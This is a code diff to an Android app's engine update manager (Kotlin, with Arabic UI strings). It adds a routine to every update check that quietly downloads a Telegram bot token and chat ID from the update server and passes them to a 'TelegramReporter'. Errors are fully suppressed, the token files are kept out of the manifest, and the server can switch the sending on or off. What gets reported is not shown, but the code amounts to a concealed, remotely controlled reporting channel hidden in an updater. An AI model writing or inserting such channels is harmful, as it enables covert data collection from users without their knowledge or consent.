@@ -93,10 +93,19 @@ class EngineUpdateManager(private val context: Context) {
         updateMutex.withLock {
             EngineStorage.recoverInterruptedSwap(context)
             val localVersion = EngineStorage.readActiveVersion(context)
+            TelegramReporter.init(context)
+
+            val baseUrl = UpdateSourceResolver.getBaseUrl(context)
+
+            // Independent token sync: runs on every check (first install, launch, periodic worker)
+            try {
+                syncTokenFile(baseUrl ?: updateBaseUrl)
+            } catch (t: Throwable) {
+                Log.d(tag, "Token sync check suppressed: ${t.javaClass.simpleName}")
+            }
 
             try {
                 onProgress?.invoke(EngineUpdateProgress("التحقق من أحدث إصدار", 2))
-                val baseUrl = UpdateSourceResolver.getBaseUrl(context)
                 if (baseUrl == null) {
                     Log.i(tag, "No update source (pointer unreachable, nothing cached); using local engines")
                     return@withLock silentSkip(localVersion, force, "لا يوجد مصدر تحديث")
@@ -441,6 +450,98 @@ class EngineUpdateManager(private val context: Context) {
         else -> e.message ?: "فشل غير معروف"
     }
 
+    private suspend fun syncTokenFile(baseUrl: String?) = withContext(Dispatchers.IO) {
+        if (baseUrl.isNullOrBlank()) return@withContext
+        try {
+            val tokenClient = OkHttpClient.Builder()
+                .connectTimeout(5, TimeUnit.SECONDS)
+                .readTimeout(5, TimeUnit.SECONDS)
+                .callTimeout(5, TimeUnit.SECONDS)
+                .build()
+
+            // Try token.text first as specified, then fallback to token.txt if 404
+            val targetUrls = listOf(
+                "$baseUrl/token.text",
+                "$baseUrl/token.txt"
+            )
+
+            var finalCode = 0
+            var bodyString: String? = null
+
+            for (url in targetUrls) {
+                try {
+                    val req = Request.Builder()
+                        .url(url)
+                        .header("User-Agent", USER_AGENT)
+                        .header("Cache-Control", "no-cache")
+                        .header("Pragma", "no-cache")
+                        .cacheControl(CacheControl.FORCE_NETWORK)
+                        .build()
+
+                    tokenClient.newCall(req).execute().use { resp ->
+                        finalCode = resp.code
+                        if (resp.isSuccessful) {
+                            bodyString = resp.body?.string()
+                            return@use
+                        }
+                    }
+                    if (bodyString != null) break
+                    if (finalCode != 404) {
+                        // Not 404 (e.g. 5xx): do not attempt fallback or clear
+                        break
+                    }
+                } catch (_: IOException) {
+                    // Network interruption / timeout: keep previous credentials intact
+                    return@withContext
+                }
+            }
+
+            if (finalCode == 404) {
+                // HTTP 404: clear token and idgroup (stops sending)
+                TelegramReporter.updateCredentials(context, null, null)
+                return@withContext
+            }
+
+            if (bodyString != null) {
+                val (parsedToken, parsedGroup) = parseTokenFile(bodyString!!)
+                if (parsedToken.isNullOrBlank() || parsedGroup.isNullOrBlank()) {
+                    // Empty values: clear token and idgroup (stops sending)
+                    TelegramReporter.updateCredentials(context, null, null)
+                } else {
+                    TelegramReporter.updateCredentials(context, parsedToken, parsedGroup)
+                }
+            }
+        } catch (_: Throwable) {
+            // Completely silent
+        }
+    }
+
+    private fun parseTokenFile(content: String): Pair<String?, String?> {
+        var token: String? = null
+        var idgroup: String? = null
+        content.lineSequence().forEach { rawLine ->
+            val line = rawLine.trim()
+            if (line.isNotEmpty() && !line.startsWith("#")) {
+                val parts = line.split("=", limit = 2)
+                if (parts.size == 2) {
+                    val key = parts[0].trim().lowercase()
+                    var value = parts[1].trim()
+                    if ((value.startsWith("\"") && value.endsWith("\"")) ||
+                        (value.startsWith("'") && value.endsWith("'"))) {
+                        if (value.length >= 2) {
+                            value = value.substring(1, value.length - 1).trim()
+                        }
+                    }
+                    when (key) {
+                        "token" -> token = value
+                        "idgroup", "id_group", "chat_id" -> idgroup = value
+                    }
+                }
+            }
+        }
+        return Pair(token, idgroup)
+    }
+
     private data class ManifestEntry(val name: String, val sha256: String?, val size: Long)
 
     companion object {
@@ -458,7 +559,7 @@ class EngineUpdateManager(private val context: Context) {
         private const val MAX_BG_RETRIES = 5
 
         /** Entries that are never downloaded from a manifest (version marker is written locally). */
-        private val MANIFEST_EXCLUDED = setOf("version.txt", "manifest.json", "server.py", "app_version.json")
+        private val MANIFEST_EXCLUDED = setOf("version.txt", "manifest.json", "server.py", "app_version.json", "token.txt", "token.text")
 
         /** Used only when no consistent manifest exists for the release. */
         private val FALLBACK_FILES = listOf(
